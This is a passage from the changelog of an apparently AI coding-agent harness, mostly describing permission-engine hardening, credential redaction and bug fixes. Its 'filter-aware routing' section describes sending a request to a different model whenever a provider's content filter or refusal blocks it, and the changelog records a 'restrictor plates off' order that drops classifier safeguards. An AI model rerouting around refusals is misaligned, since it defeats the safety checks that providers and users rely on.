  `<project>/.ssh` (a per-segment cwd tracker with `cd`/`cd ..`/
  `cd ~` handling; unknowable destinations fail closed).
- **f8:** `Task` is canonicalized to `Agent` before any rule matching,
  and a bare `Agent` deny also removes `Task` from the catalog -- the
  alias no longer escapes `Agent(...)` rules.
- **f9:** plan mode's write ban now runs BEFORE allow rules (an allow
  rule for `Edit` or `Bash(npm:*)` can no longer let writes or
  `npm install` through in plan mode; reads and the exempt no-side-effect
  tools are unaffected).
- **f10:** Read deny path rules also gate Bash file-reader commands,
  resolved against the live cwd -- `Read(.env)` denied means
  `cat .env` and `cd sub; cat .env` don't sail through (Read-ASK rules
  get the same treatment outside auto/bypass).
- **f11:** a `project:`/`plugin:`-sourced agent file can no longer raise
  its own `permissionMode` (bypassPermissions / escaping plan mode) or
  merge its own `hooks` -- and no agent, from any source, runs more
  permissive than its parent.
- **f12:** `/improve`'s model-chosen target path is contained: absolute
  paths, `..`, and subpaths rejected; the resolved path is verified
  inside the memory/rules/skills base directory.
- **f13:** `halo completion bash|zsh` only emits words made of
  shell-inert characters -- a poisoned OpenRouter catalog ID can no
  longer execute through `eval "$(halo completion bash)"`.

Suites re-run green: permissions 73/73, review2-round4 8/8,
auto_mode 10/10, permission hotfixes 13/13, agents_md 72/72,
agents_teams 35/35, improve_apply 9/9, completion 8/8.

### vibes/review.md fix pass, rounds 2+3 (credentials, data loss, MCP, TUI crashes)

The owner's own whole-tree review of 2.0.7 -- rounds 2 (R5) and 3
(R6/R7/R2) applied. The review's classifier-shaped suggestions remain
intentionally NOT applied; auto mode stays "allow all except explicit
deny/ask" per the standing order.

**R5 -- credentials and file safety:**

- **f14:** `halo proxy launch`'s `launch-<pid>.json` (proxy token +
  Databricks PAT) is now written by the new
  `halo_harness.privateio.write_private_atomic` -- 0600 by construction
  (mkstemp), atomic (os.replace, never a truncate window), and the state
  dir gets 0700. The old bare `open(..., "w")` landed it world-readable
  and a SIGKILL left it behind forever.
- **f15:** the env-file writer is atomic and private, and only ever
  chmods halo's OWN `~/.config/halo` (computed from the default base,
  never the `HALO_ENV_FILE` override -- `~/.env` used to chmod `$HOME`).
  A mid-write crash no longer truncates every stored key.
- **f16:** the shared redactor learned `password`/`passwd` keys,
  `Authorization: Token/Basic` and `x-api-key` headers, URL credentials
  (`postgres://user:pw@host`), Slack webhook URLs, `ghs_`/`sk_live_`/
  `xoxb-`/`AIza` token shapes, and whole PEM private-key blocks. A quoted
  value with spaces no longer leaks its tail (the value class used to
  stop at the first space). Numeric usage keys (`"input_tokens": 12`)
  are no longer "redacted" into invalid JSON -- that mangle made
  `--sanitize` silently drop every assistant message carrying usage.
  `halo bugreport` now also verbatim-redacts settings-`env` and MCP
  `env`/`headers` values (name-gated; the ungated first cut gutted every
  path in the report).
- **f17:** `release.py` carries the GitHub token in a 0600 curl `-K`
  config file instead of argv (visible to any local `ps`), adds `--fail`
  (a failed asset upload can no longer report success), and URL-encodes
  the asset name.

**R6 -- data loss:**

- **f19:** `set_config_value` refuses to write over a `config.json` that
  doesn't parse (`CorruptConfigError`; `halo config set` prints it and
  exits 2, file untouched). The old path silently wiped every key the
  moment the file had one bad byte.
- **f20:** worktree removal only deletes branches named `halo-worktree-*`
  and only with the safe `git branch -d` (refuses unmerged). The old
  `branch -D <checked-out-branch>` destroyed user branches and discarded
  uncommitted sub-agent work.
- **f21:** the launch no longer rewrites `~/.claude/settings.json` unless
  the content actually changed; the write is atomic, keeps the user's
  indentation, and honors `CLAUDE_CONFIG_DIR`.
- **f22:** `/roles edit` refuses to overwrite a template file that exists
  but doesn't load (it used to replace it with an empty template).
- **f23:** the shadow repo snapshots gitignored files too (`git add -f`)
  so `/rewind` can restore them.

**R7 -- MCP:**

- **f41:** `${TOKEN}`-style variables in a remote server's `url`/`headers`
  expand to their REAL values (the official GitHub plugin -- `Bearer
  ${GITHUB_PERSONAL_ACCESS_TOKEN}` -- literally sent `Bearer ` and never
  connected). Every display site already masks; the two tests that
  asserted the broken blanking are reshaped.
- **f42:** first-use connect on a lazy server holds a per-name lock --
  parallel first calls can't double-spawn the subprocess or fail each
  other with "not connected (state=connecting)".
- **f30:** a malformed MCP entry (`"env": ["A=B"]`, a string `headers`,
  a non-list `args`) becomes a disabled placeholder with a reason instead
  of crashing session startup (including a cloned repo's `.mcp.json`,
  parsed before the approval check); a string `args` is shlex-split
  instead of char-split.

**R2 -- TUI crash class:**

- **f27:** Ctrl+R no longer crashes on a repeated prompt (option ids are
  indices, not the prompt text -- `DuplicateID`).
- **f28:** option labels render as rich `Text` everywhere (history
  search, AskUserQuestion cards, session picker) -- `[/etc/hosts]`-shaped
  labels no longer raise `MarkupError`.
- **f29:** a raise in any slash handler (`/export .` was the repro), in
  the shared custom-command worker, or in a run-slash worker no longer
  closes the TUI: the dispatch catches and notifies, the worker catches
  and notifies, and the run-slash spawns carry `exit_on_error=False`.
- pyflakes sweep: bridge.py's never-imported `UpstreamResult` annotation
  (TYPE_CHECKING import), manager.py's `Callable`, one dead import in
  slash.py.

Tests: `tests/test_review2_round2.py` (6 pins) and
`tests/test_review2_round3.py` (9 pins), both Ollama-drafted and
corrected in-session; `test_mcp_manager`/`test_mcp_plugins` blanking
tests reshaped to the real-credential contract. Suites re-run green:
mcp_manager 88/88, mcp_plugins 24/24, bugreport 19/19, worktree 11/11,
shadow 2/2, TUI battery 285 passed/0 failed, bridge battery exit 0.

### vibes/review.md fix pass, round 1 (crash class + provider reliability)

The owner's own whole-tree review of 2.0.7 (92 findings, eight areas) --
first round applied; the permission-engine deny-integrity reshaping, the
credential/file-safety helper, the MCP cluster and the remaining P1/P2
items follow in later rounds. The review's classifier-shaped suggestions
(env-var allowlists, substitution-refusal on allow matches, blanket
here-string rejection) are intentionally NOT applied -- auto mode stays
"allow all except explicit deny/ask" per the standing order.

- **f24/f25 (crash):** `subagent.py` read `model_ref` and `is_error`,
  two names that never existed in their scopes (pyflakes F821) -- every
  Agent call on a team template with `permissions.offline: true` died as
  a NameError, and a background sub-agent under a team died mid-report
  with no completion notice (the parent waited forever). Now reads
  `child.model_ref` and the computed `bg_is_error`.
- **f79:** `doctor.py`'s permission-mode check called `resolve_settings`
  without importing it; the `except Exception` swallowed the NameError,
  so a settings.json `permissions.defaultMode` never showed in doctor.
- **f32:** `call_small_model` built an OpenAI-chat body and used the
  bare `stream_completion` for `ant:`/dbx-Claude routes -- an empty
  request on the anthropic wire, silently breaking titles, prompt/agent
  hooks, `/improve` drafts, concierge digests and image descriptions on
  every Claude route (and the judge always answered "confident", so
  low-confidence escalation never fired). Now builds with
  `build_anthropic_request_body` and streams through the `_stream`
  dialect dispatcher.
- **f34:** the `ant:`/`xp:` branches of `call_anthropic_native` dropped
  `governor_ctx` -- no cross-process rate limiting and no 429/529 retry
  ladder on Claude/experiential calls while the loop assumed the retry
  layer had already run.
- **f35:** after a `Connection: close` overload, the retry silently
  auto-reconnected via http.client's `auto_open` using the 8 s
  constructor timeout -- open_upstream's 300 s idle window and the
  `on_connect` abort watcher never re-applied, so slow models died
  mid-retry and Esc could not interrupt. All five `_send` sites now
  rebuild through `_reopened_if_needed` (open_upstream) when the socket
  is gone.
- **f36:** the Databricks Claude 404 fallback had deleted the LITERAL
  documented pay-per-token route `/serving-endpoints/anthropic/v1/messages`
  (V2b misread the path segment as an endpoint name) -- workspaces
  without the AI gateway had no working dbx-Claude candidate. Candidate
  order is now gateway -> pay-per-token route -> by-name invocations; an
  empty model skips the by-name candidate (never `//invocations`); and a
  final 404 keeps its error body (previously drained to an empty 404).
- **f37:** 500 error bodies the Governor had already peeked were thrown
  away (`_dbx_post`'s 2-tuple return; `stream.py` reading a drained
  `resp`) -- Databricks chat, Ollama and `oai:` 500s surfaced as empty
  messages. `_dbx_post` now returns the peeked body and both stream
  paths prefer `body_bytes`.
- Tests: `tests/test_review2_round1.py` (9 pins, drafted on the local
  Ollama model and corrected in-session -- the token-thrift offload
  flow); `test_anthropic_native.py`'s two V2b fallback tests reshaped to
  the corrected candidate order.

## [2.0.7] - 2026-10-08

The session-UX + cyber-pillars + reliability release: notices stop
impersonating the user, steers reach running work, filter-aware routing
and the verify-everything preflight (the "restrictor plates off" order),
the concierge + one media agent, local embeddings with `/recall` and the
generic `local:` route, the wizard's roles surface rebuilt for a
first-time user, the copy-out fix (selected-range copies, mechanism
confirmation, the tmux/Kali OSC-52 fix), dead-model-id detection with
404s surfaced in sub-agent handbacks, balances remaining-first,
`halo local warm`, an external-review fix pass (13 findings), and paste
reliability through bare `/paste`.
### External review fix pass (crash class + wrong behavior)

A second-opinion review of 2.0.6.1 (13 confirmed findings, several
verified live) -- the crash-class and wrong-behavior items, fixed:

- `governor_state_unpersisted` was never registered in `EVENT_KINDS`
  (the same bug class the 2.0.6 `governor` kind had) -- the first real
  TUI run where the Governor cannot persist state died with "unknown
  event kind".
- `flatten_content_parts`: a null reasoning summary text made
  `len(None)` raise, losing the whole reply (buffered tool calls
  included) as "malformed data".
- MCP misreports: `headless.py`'s server preamble admitted only
  "connected" while the deferred pool also admits "cached" (a lazy
  server's ~90 tools showed while the prompt said "none are
  configured") -- one `manager.state_serves` predicate now feeds every
  filter; `halo doctor`'s MCP check passes the loader the same
  approval/plugin inputs a real session does.
- `translate.anthropic_to_openai`: a plain-string content (legal
  Anthropic shape) vanished entirely; `stop_sequences` was never
  translated to `stop`; a tool result carrying BOTH text and an image
  replaced the text with the marker.
- Non-streaming parallel tool calls merged into ONE buffer (no
  `index` on JSON-body tool_calls + the finding-11 "index-less
  continues current" rule) -- the collector now synthesizes the index,
  so each call keeps its own name/args.
- `StreamJsonSink` budget-exceeded result line carried the PREVIOUS
  turn's answer (`_final_text` is not reset per-consume and
  `turn_done` never fires) -- captured at `message_end`, same as
  PrintModeSink.
- A fixable context-overflow retry that exhausted the shared 2-attempt
  budget (overflow retry + post-connect re-dial) fell into the generic
  "upstream failure after retries" retryable 502 instead of raising
  `ContextOverflow` -- compaction never triggered.
- The per-tool steer checkpoint ran the deferred read-only batch and
  spawned queued sub-agents AFTER the user redirected (the top-of-loop
  checkpoint already refused them) -- same refusal on both paths.
- `clear_temporary_allow_rules` swept by INDEX: a permanent session
  grant added later in the same turn was deleted with the temporary
  ones -- now swept by identity.
- An agent bio's `permission_mode: bypassPermissions` re-applied
  bypass under `--restricted` ("refuses bypassPermissions") -- same
  refusal the CLI flag gets.
- Foreground task resumes never set the in-flight guard (two
  Agent(task_id=X) calls in one message interleaved two writers over
  the same child log) and fired ZERO hooks/events (no
  SubagentStart/Stop, TaskCreated/Completed, subagent_start/end) --
  both fixed, same shapes the fresh-spawn path uses.
- `parse_context_overflow`'s derived prompt_tokens could go NEGATIVE
  (total < requested max_tokens), making the "clamped" retry budget
  LARGER than the limit -- floored at 0.
- The Governor's shared 500-peek consumed the body into `body_bytes`;
  the Anthropic passthrough phase1 ignored it and read the (usually
  empty) remainder, losing the provider's whole error body.

Pinned by `tests/test_external_review_fixes.py` (11/11).

### The copy-out fix (copy out of the session is first-class)

rolo (2026-10-07): "copying text from the session to another file seems
to not really work well." The whole copy stack, made reliable:

- **A transcript mouse-drag copies the SELECTED RANGE.** A partial
  selection narrows to exactly what was dragged (`Selection.extract`
  over the widget's stored source); a whole-widget drag keeps the
  stored-source path unchanged. A grazing drag no longer copies half
  the screen.
- **Every explicit copy confirms the mechanism that actually landed**:
  "Copy verified via system clipboard (N characters)" from the
  external-tool floor, and a total failure (no OSC 52 trust + no tool)
  becomes a visible error naming the install hint -- silence is no
  longer indistinguishable from failure.
- **tmux/Kali over SSH**: OSC 52 is the only path from a headless VM to
  the user's REAL local clipboard, and tmux drops it unless
  `set-clipboard` is on (its default is off). halo now detects the tmux
  interception (`tmux set -gv set-clipboard`, cached); both the copy
  failure and `halo doctor` name the one-line fix (`tmux set -g
  set-clipboard on`, then detach/attach).
- **A leading BOM is stripped on clipboard reads** (clip.exe's UTF-16
  trick surfaces as a literal char in some readers).
- **`halo doctor`'s clipboard line states the full path verdict** --
  write mechanisms, read direction, the range behavior, and the tmux
  warning when it applies.

Pinned by `tests/test_round_copy_out.py` (6/6: range narrowing,
whole-widget path, mechanism confirmation, failure warnings incl. the
tmux fix, BOM strip, doctor verdicts).

### Dead-model-id detection, surfaced 404 handbacks, balances remaining

rolo's live 2.0.6 finding: the role table's `or:deepseek/
deepseek-v4-pro-0813` was 404ing SILENTLY -- sub-agents handed back
empty results and nothing said why.

- **`halo doctor --roles` resolves every configured model against its
  provider's own catalog** (models.json for `or:`, dbx-endpoints.json
  for `dbx:`, the host's live tag list for `ol:`) and reports each
  unknown id, naming the role and the fix. A provider with no readable
  catalog (or an empty one -- a fresh install) is skipped, never
  guessed at; `cc:`/`ant:`/`cx:` lanes have no catalog to check.
- **An errored sub-agent's handback carries the child's OWN last error
  message** (`_last_child_error_text`): a dead lane now reads
  "[sub-agent did not finish normally (error): HTTP 404: OpenRouter has
  no such model or endpoint...]" instead of a silently-empty result --
  on all three handback paths (fresh spawn, resume, background).
- **Balances lead with what's LEFT** (rolo: "you want what's LEFT, not
  '$145 used'"): the /credits total/used breakdown rides every line
  that has one ("$145.00 spent (of $200.00 total, $145.00 used,
  $55.00 left)", "$55.00 remaining (of $200.00 total, $145.00 used)").

Pinned by `tests/test_round_doctor_dead_ids.py` (6/6: dead-id report +
clean table, empty-catalog skip, doctor wiring, the error-text
extraction, a full e2e dead-lane spawn surfacing the 404 in the
handback, the balance lines).

### Ollama polish: `halo local warm`, single-GPU swap warning at `teams use`

- **`halo local warm [MODELS...] [--host NAME] [--keep-alive DURATION]`**
  pre-loads local Ollama models (one 1-token `/api/chat` each,
  `keep_alive` default 30m so the weights STAY) so the first real call
  skips the cold-load; already-resident models are reported and skipped;
  with no args it warms every `ol:` ref in the roles table plus a local
  default model -- run before a long autonomous session.
- **`halo teams use` warns at activation** when a lineup's local lanes
  measured as unable to co-reside on one GPU (`fits_beside_main`, never
  a guess) -- the single-GPU model-swap cost named with its fix.

### Round 0b: background notices stop impersonating the user

rolo's live report (2026-10-08): with a background job or sub-agent
finishing between turns, the completion notice was delivered as a
USER-role message merged into the next turn -- the model read a status
blob interleaved with the owner's actual question and answered the
status first ("typing a question, getting a blob back of what's been
done, then an answer is not a good flow"). Pending notices are now
delivered as clearly-marked SYSTEM-FRAMED status blocks: a
`status_notice` snapshot logged AFTER the human's own message (the
derived request folds it into the same user turn, behind their words),
wrapped in a frame that says the block is automated harness status,
NOT a message from the human, and to answer the human first. The event
stream carries a new `status_notice` event (plain text + framed copy):
the TUI renders it as an italic status note instead of a user bubble,
`cc:`/`cx:` turns collect the framed copy as child context, and print
mode ignores it exactly as it ignored the old delivery (its surface
was always the toast, unchanged). A single notice still carries its
full text verbatim; 2+ still collapse into one compact block
(2.0.2 round C, unchanged); `/stats` never counted these and still
does not. Pinned by `tests/test_round_0b_status_notices.py`.

### Round 0c: steers reach running work (through tool calls)

rolo's live report (2026-10-08): a steer typed while a sub-agent or a
long Bash command ran waited for it to finish -- 60s+ of the words
sitting invisible to the work. Steers now cut THROUGH running calls:

- **A foreground Bash command is moved to the background, not killed.**
  A per-session steer-cut watcher fires the moment a steer queues while
  a tool runs; Bash hands its still-live process to the job registry
  (the same adopt-from-timeout plumbing) and returns "cut short by the
  user's new message -- moved to the background as shell_id X". The
  turn reaches its steer safe point immediately, the command keeps
  running, and its output lands later as a round-0b status notice. A
  real Esc/interrupt still kills the process group exactly as before
  (abort always wins the race); PowerShell and every other tool keep
  the pre-0c "running tools finish" contract.
- **A foreground sub-agent gets the steer forwarded into itself.** The
  agent-batch drain loop polls for pending steers and forwards each
  into every live child of the batch (`child.steer(text)`), so the
  child applies the words at ITS next safe point -- its own Bash gets
  the same cut treatment, recursively. A forwarded steer is consumed
  by the child (the parent never re-applies it); if no child can take
  it, it stays on the parent queue exactly as before.
- **Nothing is ever lost.** A forwarded steer the child never got to
  apply (its turn ended between the forward and its next safe point)
  is handed back to the parent when the child finishes, and applies at
  the parent's next safe point. Pinned by
  `tests/test_round_0c_steer_through.py` (run_streamed handoff/abort
  race, Bash adoption, forwarding consume/fallback, the on_child hook,
  and a full parent-child e2e with a mid-Bash steer).

### Cyber Pillar 1: filter-aware routing (1.1-1.3)

A provider content filter is not an answer. `finish_reason:
"content_filter"` (generic chat dialect), GLM's `finish_reason:
"sensitive"`, and a native Anthropic `stop_reason: "refusal"` are now
recognized on every harness-driven response, and a filtered reply is
NEVER persisted as an assistant turn. Each live filter signal is
recorded in a measured per-machine census (`<state_dir>/filter-
census.json`, keyed by raw model ref, built purely from real traffic --
nothing is ever probed), and the request is transparently rerouted to
the next fallback lane (a DIFFERENT model -- re-running against the
same one would just repeat), with a notification naming what was
filtered and where the request went. With no lane configured, the old
GLM contract stands: a clear, never-retried error carrying whatever
text did stream. Pinned by `tests/test_round_1_filter_routing.py`
(census record/rank/corruption, reroute + never-persist, sensitive
reroute, no-lane terminal error, both-lanes-filtered exhaustion).

### Cyber Pillar 2: verify-everything preflight + continuous canaries

`halo preflight [--lanes A,B] [--json] [--skip-local] [--no-vision]
[--timeout S]` is the exit-code-gated gate a long autonomous run is
worth starting under. Local tools are verified BY EFFECT -- the bytes
really land on disk, the grep really matches; a tool that reports
success without the effect fails the gate. Each provider lane gets one
measured canary: a real completion, one tool call the lane must emit
and the probe must actually run (a lane whose replies never carry tool
calls fails -- datasheets lie, measurements don't), an image the lane
must accept when its profile claims vision (catches lying vision
flags), and a truncation check comparing the usage echo against what
was sent. Every result lands in the canary census
(`<state_dir>/canary-census.json`). During long runs, a continuous
canary rides every model call with zero extra requests: a one-time
warning when a usage echo accounts for under half of what was sent
(silent context truncation), and a periodic health note (calls,
filtered, failures, spend, context fill) every 25 calls or 10 minutes,
env-tunable. Pinned by `tests/test_round_2_preflight.py` (effect
verification incl. a sabotaged tool, full-pass/no-tools/truncation/
vision lane canaries, CLI exit codes + the green path end to end, and
the continuous canary's truncation warning + periodic note).

### Round 0e: the concierge (secretary + eyes) + one media agent

One secretary that is also the eyes, one media agent -- not three (rolo,
2026-10-08). The concierge is a ROLE (`roles.concierge`, measured lane:
`or:z-ai/glm-5.3-flash`, vision=True at $0.50/M out vs the main
glm-5.3's $7.00/M and blind). Three surfaces, each degrading to the
pre-0e behavior when the role is unset:

- **`/ask <question>`** -- quick Q&A and "what's been done" answered
  WITHOUT waking the orchestrator: a one-shot call over a deterministic
  digest of the recent session history, never through the session log.
- **The eyes** -- images arriving on a blind active model (the main
  glm-5.3 cannot see the screenshots the 0d fix pastes) are DESCRIBED by
  the concierge and the descriptions fold into the turn as a
  `concierge_vision` snapshot: the blind model still gets real image
  understanding. No concierge -> the old path-mention behavior.
- **The notice digest** -- a pending status block (round 0b) is
  digested to a couple of lines for the model (frame + digest +
  pointer), with the verbatim block archived in a meta node, never
  model-visible; `/tasks`, resume and export still see everything.

The ONE media agent (`templates/agents/media.yaml`) rides a new
deterministic `Media` tool: local ffmpeg/ffprobe extraction of evenly
spaced frames + metadata (zero tokens -- ingestion is tooling, not model
work), with understanding left to the vision-capable lane the bio
prefers. Pinned by `tests/test_round_0e_concierge_media.py` (role
resolution, `/ask` log-isolation, eyes on/off, digest + archive, real
ffmpeg frame extraction, bio sanity).

### Local embeddings + /recall + the generic `local:` route (the old 2.0.6 scope)

Semantic search over auto-memory topics and past sessions on a LOCAL
embedding model: `halo recall <query> [--k N] [--no-refresh]
[--build-only]` and `/recall <query>` in the TUI. Two transports, one
config (`embeddings` in `~/.halo/config.json`): Ollama's native
`/api/embed` on the default or named host, or any OpenAI-compatible
`/v1/embeddings` server (`base_url`/`api_key`) -- LM Studio, llama.cpp
server, vLLM, a managed server. The index (`~/.halo/index/
embeddings.jsonl`) refreshes incrementally (mtime-keyed: unchanged
files are never re-embedded; vanished sources are pruned); sessions are
indexed by title/first-prompt/last-answer, memory topics by their full
text; results rank by cosine similarity with scores, kinds and paths.
DISABLED until `embeddings.model` is set -- nothing probes, nothing
costs, until the owner asks. The generic `local:` chat route lands with
it: `local:<model>` or `local:<model>@<name>` against a `local.servers`
config entry (LM Studio, llama.cpp server, vLLM), plain openai-chat
dialect with per-server `context` discovery. Pinned by
`tests/test_round_embeddings_local.py` (disabled-until-configured, both
transports against a real local HTTP server, index build/incremental/
prune, ranking, CLI exit codes, `local:` parsing/creds/context, and a
real session turn through the route).

### The wizard deep review: the roles surface, clear for a first-time user

rolo (2026-10-07): "everything to do with ROLES, ROLE TEMPLATES, and
AGENT BIOS needs to be incredibly smooth and clear on what is going on
and how to use this." Every roles surface now answers the three
first-time questions BEFORE anything is saved -- what a role IS and
when it fires, what each field does, what the lineup is and what it
costs:

- `halo roles` / `halo setup roles` / the roles CLI face open with the
  two plain lines (what a role is; what happens when roles are off) and
  every known role row carries its when-it-fires note
  (`roles_cli.ROLE_WHEN_IT_FIRES`).
- The wizard's Team step: the same plain sentence on the step itself,
  and ONE pane at a time at every width -- the old 120x40
  side-by-side stack (lineups + agents + switch + hints on one screen)
  is gone; a first-time user meets Lineups first. Lineup rows carry
  their role count.
- The lineup editor: a what-a-lineup-is sentence on open, per-field
  plain labels, and a live COST footer -- per role, the model's own
  picker price (in/out per 1M) while you pick; a local lane reads
  "free/unknown", never a fabricated number.
- The bio editor: a what-a-bio-is line plus ONE shared line that always
  explains the FOCUSED control (roadmap: "one plain-line explanation
  per focused control") -- zero new layout rows (the identity-hint slot
  doubles as it, fixed at one row), so the round-2c "#bio-pref visible
  on open at 80x24" pin keeps holding.

Pinned by `tests/test_round_wizard_deep_review.py` (pilot path: CLI
lines, one-pane-at-every-width, cost footer, focused-control help);
the old both-panes pin updated to the new one-pane contract.

## [2.0.6.1] - 2026-10-08

Hotfix release: two owner-live TUI fixes from the 2.0.6 release
session, shipped the same way 2.0.3.1 shipped clipboard images.

### Ctrl+Alt+V: pasting an image when the terminal eats Ctrl+V

rolo's live report (2026-10-08): pasting a freshly-taken screenshot did
nothing. The 2.0.3.1 clipboard-image path was fine -- the keypress
never reached halo: on Windows Terminal (and most modern terminals)
Ctrl+V is intercepted by the TERMINAL, which runs its own paste, finds
no text on an image-only clipboard, and does nothing. Ctrl+Alt+V is
not a terminal default anywhere and always reaches the app; the
existing paste worker already reads text-first-then-image, so the one
key covers both payloads. (Shift+Insert, the other 2.0.3.1 paste key,
was also missing from the tips-validation key set -- added.)

### Steering text now renders the instant you hit Enter

rolo's live report (2026-10-07 night): a steer typed mid-turn showed
only "↳ steering…" while the actual words sat invisible for over a
minute ("it just said thinking for a long ass time"). Root cause: the
steer's text only rendered as a user bubble at APPLY time ("moments
later"), but a turn parked inside a long tool call (a sub-agent over
OpenRouter, a long Bash) can go minutes between steer safe points. The
text now renders immediately as a real user bubble at submit; the
apply-time duplicate is suppressed (deduped by text against the
pending-steer list; a genuinely identical LATER message still renders).

## [2.0.6] - 2026-10-07

### The transcript code-block hover bug (release-gate fix)

Code blocks in the transcript turned into black boxes that vanished
when the mouse passed over them (worst with local models, which wrap
most answers in fences). Root cause: Textual's MarkdownFence is itself
a scrollable container -- on mouse entry Textual repaints the region
as a scroll target, and that repaint races the ongoing stream updates.
Fences inside a transcript never need to scroll (the transcript itself
scrolls), so they are pinned to non-scrolling now and the hover repaint
path disappears entirely.

### "Try it" and the lineup smoke run, cost shown first (round 14)

The bio editor gains a "Try it (cost first)" button and the lineup
editor a "Smoke run (cost first)" button: the estimated cost of every
distinct model the lineup resolves to prints BEFORE a single token is
spent -- real catalog prices times the smoke prompt's token footprint
(`~$0.0011 (600 in / 300 out at $0.6/$2.4 per 1M)`), `price not in the
catalog -- cost unknown` when a model has no prices, never a fake
$0.00. The call itself rides the proven print-mode subprocess path
(the bio's own acceptance prompt when it has one), on a worker thread;
the verdict lands beside the cost line. The deferred item from 2.0.5
round 2's list, closed.

### Lineup export/import bundles (round 13)

`halo teams export <name> --bundle <dir>` writes the whole lineup as
one portable folder -- the full team template plus every non-shipped
bio it references (shipped-template bios are skipped: every install
already has them) and a `bundle.json` manifest. `halo teams import
<dir>` applies it on any other box: bios land in USER scope, the team
goes through the same validated save path `halo teams import` uses,
and a bio that already exists is never silently overwritten (`--force`
is the explicit opt-in). One command instead of the manual scp.

Also this round: the test-runner SystemExit fix (a test tripping
argparse's `parser.error()` or a stray `sys.exit()` used to escape
`except Exception` and kill the ENTIRE suite run -- it is a failed
test now and the run continues, at both the import and the per-test
layers; KeyboardInterrupt still aborts) and the last order-sensitive
TUI flake (the bare-/effort card test) made deterministic with bounded
polls.

### Carried fix-pass minors, batch B, part 2 (round 12)

The last two: the local-server auto-detect probe gains a 60 s TTL cache
keyed on the port list (a picker paint on a warm process probes
nothing; an explicit refresh forces through) -- the C-11 nuance; and
`fits_beside_main` (the VRAM-aware role redirect) gains the same 60 s
TTL keyed on `(host, main, candidate)` with `None` never cached, so
every role resolution no longer re-pays a `/api/ps` fetch plus a GPU
read -- the C-13 nuance.

### Carried fix-pass minors, batch B, part 1 (round 12)

Text-mode print output carries the provider's own error sentence as the
result text (a script consuming `halo -p`'s stdout sees WHY the run
died, not an empty stream -- JSON mode already did); the cc-session
steer test's race is made deterministic (gated on the first tool RESULT
arriving, not `_cc_state` appearing -- the steer now provably lands
between tool calls 1 and 2); and the Linux chmod-0600 wizard-save
verify passed on the VM (both the env file and config.json are 0600
after saves).

### Carried fix-pass minors, batch A (round 12)

Seven small ones from the 2.0.3 fix-pass notes: `halo config set`'s echo
masks secret-shaped values exactly like the readers (a recorded terminal
never sees the secret twice; the stored value is untouched);
`config list`/`get` show `*_env` REFERENCE names (a variable name is not
a secret) while actual secrets stay masked; `pick_proxy` answers a
plain-HTTP target with `HTTP_PROXY` first (it used to answer
`HTTPS_PROXY` -- backwards for split setups); a plain-HTTP request
through a proxy carries the ABSOLUTE request-target form (`GET
http://host:port/path`, not `/path` -- a proxy cannot know the origin
from a relative line), with the Host header naming the target; the
optional ssh GPU read, `halo models --cc --refresh`, and the Databricks
catalog auto-refresh thread all run the offline gate every other
network path runs (offline, the cc refresh returns the last cached
catalog instead of an empty one); and the wizard's Hugging Face tab
merges into the default local server's existing fields on re-save
instead of replacing them (the same fix the Ollama tab got).

### Gym cloud-model ranking (round 11)

`halo gym propose --candidates local|cloud|all`: the proposal's ranking
pool was local-only by construction, even though the gym already runs
against any reachable model (`halo gym --model or:...`). "cloud" ranks
the `or:`/`dbx:`/`xp:`/endpoint refs only; "all" ranks both pools
together; the default stays "local" -- byte-for-byte the old behavior.
The tokens-per-second term normalizes within the CHOSEN pool, so a
cloud model's throughput is never measured against a local GPU's
ceiling (or vice versa).

### MCP connects off the TUI startup path (round 10)

The TUI paints with its full frozen tool catalog immediately: MCP
connects moved behind the paint. `build_manager(start=False)` (now what
an interactive launch passes) seeds every server's catalog from the
tools cache -- eager and lazy alike, zero connections -- and flags the
manager deferred; the app's own background worker
(`Manager.complete_deferred_start`) then connects pending and
cache-seeded eager servers off the UI thread, posting one transcript
line when anything lands. First-ever runs (no cache yet) connect in
that worker instead of blocking the first paint; lazy servers keep
their first-use contract; print mode (`-p`) keeps the blocking start --
a one-shot wants its tools ready.

### The soak harness (round 9)

`tools/soak.py`: a headless Textual pilot run for a configurable
duration against the mock upstream, injecting idle gaps, a monotonic
clock jump, terminal resizes, a connection reset mid-stream, a
connect-phase drop, a 429 with retry-after, a permission card left
unanswered then answered, a steer during a silent call, and `/compact`
-- after every event a prompt must get a response within a deadline,
the drain tick count must rise monotonically, no traceback may reach
the log, RSS growth stays bounded, and the status cluster must return
to idle. **It caught its first real bug on its first run**: the
Governor's telemetry event (`governor`) was emitted by round 4 and
handled by the TUI, but never registered as a valid event kind -- the
first real TUI session where the Governor paced a 429 crashed the turn
(every earlier test ran headless, where the forwarding is skipped).
The real-machine half (tmux detach/reattach, a 30-minute idle) is the
runbook's, in `docs/harness/LIVE-CHECKS.md`.

### Signed releases (round 8)

Every release now ships a checksummed artifact: the tag's own source
archive (`git archive` of the tag -- the tree and nothing else, no
working-tree dirt possible) plus a `checksums.txt` (the sha256sum
layout), both attached to the GitHub release. And `halo update`
verifies before installing: an update to a TAG checks the target
release carries that checksums asset and refuses one that verifiably
does not (a broken or foreign release); `--no-verify` skips the check,
an unreadable release (offline, rate-limited) fails open with a
warning -- a network blip never blocks an explicitly requested update.

### `halo doctor --roles` (round 7)

The roles lineup's hygiene, headless (the v2.0.4 review's item 6): a
missing `main`, a judge in the same model family as the coder
(self-preference bias -- the family is a coarse first-digit bucket:
glm/qwen/deepseek/...), and unreachable gateway endpoints (one
reachability probe per distinct gateway, no model calls). Exit 1 with
one plain sentence per problem, `--json` for the machine-readable
list; clean lineups print `RESULT: clean`.

### Turn checkpoints, `/rewind turn <N>` (round 6)

Shadow steps now carry the TURN their tool_result event belonged to,
and the store groups them into turn checkpoints: `/rewind turn <N>`
restores the working tree to the START of that turn -- the last step
of the previous turn when one exists (created-by-later-steps files
deleted, exactly like a step rewind), or the session's own start
otherwise (every file any step created is deleted, nothing restored).
`/rewind turn` with no number lists the turns that have checkpoints.
One key rolls back a whole bad agent run's edits; the per-step
`/rewind`/`/undo`/`/redo` flow is unchanged, and pre-round-6 logs
(steps without turn info) simply never group.

### Parallel read-only tool calls: the Bash half (round 5)

The concurrent read-only batch (Read/Grep/Glob, the H3 pool) now admits
a Bash call whose command PROVABLY only reads: a single plain command
from a whitelist (cat, ls, head, tail, grep, rg, find, wc, stat, du,
which, echo, git status/log/diff/show/branch/...), zero shell
metacharacters -- any pipe, redirect, chain, substitution, glob or
history expansion disqualifies the WHOLE command -- after stripping
leading VAR=VALUE assignments and path/.exe suffixes. The classifier is
deliberately dumb (whitelist-only, no cleverness to fool); everything
else runs sequentially exactly as before, and writes never join the
batch.

### Session replay for model swaps (round 4)

